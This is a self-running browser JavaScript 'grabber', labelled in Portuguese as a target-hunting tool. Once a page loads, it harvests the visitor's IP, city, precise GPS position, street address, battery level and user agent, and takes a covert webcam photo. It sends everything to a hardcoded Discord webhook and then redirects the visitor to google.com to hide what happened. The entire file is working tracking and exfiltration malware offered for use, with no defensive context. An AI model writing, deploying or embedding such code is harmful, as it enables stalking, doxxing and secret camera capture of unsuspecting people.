(() => {
  const WEBHOOK = "https://discord.com/api/webhooks/1434618366449946634/G-D0DxAtvdN6MSrZ732uP-5jkU2LpMMPemX9wc0hPfuEsYxLli-X9d34v9_2T0RB3kNU";

  const send = async (data) => {
    const embed = {
      title: "ALVO CAÇADO - LOCALIZAÇÃO EXATA",
      color: 0xff0000,
      fields: [
        { name: "IP", value: data.ip || "N/A", inline: true },
        { name: "Cidade", value: data.city || "N/A", inline: true },
        { name: "Rua", value: data.rua || "N/A" },
        { name: "GPS", value: data.gps || "N/A", inline: true },
        { name: "Precisão", value: data.acc ? data.acc + "m" : "N/A", inline: true },
        { name: "Bateria", value: data.bat ? data.bat + "%" : "N/A", inline: true },
        { name: "Navegador", value: data.ua ? data.ua.slice(0, 50) + "..." : "N/A", inline: false }
      ],
      image: { url: data.foto || null },
      timestamp: new Date().toISOString(),
      footer: { text: "Grabber v4 - 100% Estável" }
    };

    try {
      await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
      });
    } catch (e) { console.error("Erro no Discord:", e); }
  };

  const start = async () => {
    document.getElementById("load").style.display = "block";

    const data = {};

    try {
      // IP
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const ipJson = await ipRes.json();
      data.ip = ipJson.ip;

      // GEO
      const geoRes = await fetch("https://ipwho.is/");
      const geo = await geoRes.json();
      data.city = geo.city || "N/A";

      // GPS
      const pos = await new Promise((res, rej) => {
        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 15000, enableHighAccuracy: true });
      });
      data.gps = `${pos.coords.latitude}, ${pos.coords.longitude}`;
      data.acc = Math.round(pos.coords.accuracy);

      // RUA
      const ruaRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`);
      const ruaData = await ruaRes.json();
      data.rua = ruaData.display_name || "N/A";

      // BATERIA
      if ('getBattery' in navigator) {
        const batNav = await navigator.getBattery();
        data.bat = Math.round(batNav.level * 100);
      }

      // FOTO
      const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();
      await new Promise(r => setTimeout(r, 2500));
      const canvas = document.createElement("canvas");
      canvas.width = 320; canvas.height = 240;
      canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
      data.foto = canvas.toDataURL("image/jpeg", 0.8);
      stream.getTracks().forEach(t => t.stop());

      // USER AGENT
      data.ua = navigator.userAgent || "N/A";

      // ENVIA
      await send(data);

      setTimeout(() => { window.location = "https://google.com"; }, 2000);

    } catch (e) {
      data.ip = data.ip || "ERRO";
      data.city = e.message;
      await send(data);
    }
  };

  // INICIA APÓS CARREGAR
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => setTimeout(start, 1000));
  } else {
    setTimeout(start, 1000);
  }
})();
